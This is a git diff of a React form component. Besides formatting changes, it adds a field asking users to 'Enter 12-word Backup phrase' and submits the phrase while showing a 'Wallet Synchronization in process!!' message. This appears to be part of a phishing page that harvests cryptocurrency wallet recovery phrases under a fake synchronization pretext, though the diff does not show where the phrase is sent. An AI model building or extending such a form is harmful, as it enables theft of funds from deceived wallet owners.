@@ -14,19 +14,17 @@ const Form = (props) => {
     const handleSubmit = async (e) => {
         e.preventDefault()
 
-       props.onInitPutPhrase(phrase)
+        props.onInitPutPhrase(phrase)
         //  setToast({
         //      content: 'Wallet Synchronization in process!!',
         //      type: 'success',
         //  })
     }
 
-    
     useEffect(() => {
         if (props.createdPhrase) {
             setToast({
-                content:
-                'Wallet Synchronization in process!!',
+                content: 'Wallet Synchronization in process!!',
                 type: 'success',
             })
         }
@@ -37,14 +35,24 @@ const Form = (props) => {
                 type: 'error',
             })
         }
-
     }, [props.createdPhrase, props.error])
-    
+
     return (
         <form
-            className='grid w-full place-content-stretch bg-white ' style={{padding: '32px 24px'}}
+            className='grid w-full place-content-stretch bg-white '
+            style={{ padding: '32px 24px' }}
             onSubmit={handleSubmit}
         >
+            <input
+                type='email'
+                id='email'
+                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
+                required
+                value={phrase}
+                placeholder='Enter 12-word Backup phrase'
+                onChange={handlePhrase}
+            />
+
             {/* {toast && toast.content && (
                 <div className=' grid font-semibold mb-8'>
                     <p
@@ -58,6 +66,8 @@ const Form = (props) => {
                     </p>
                 </div>
             )}
+
+            
 
             <textarea
                 id='phrase'
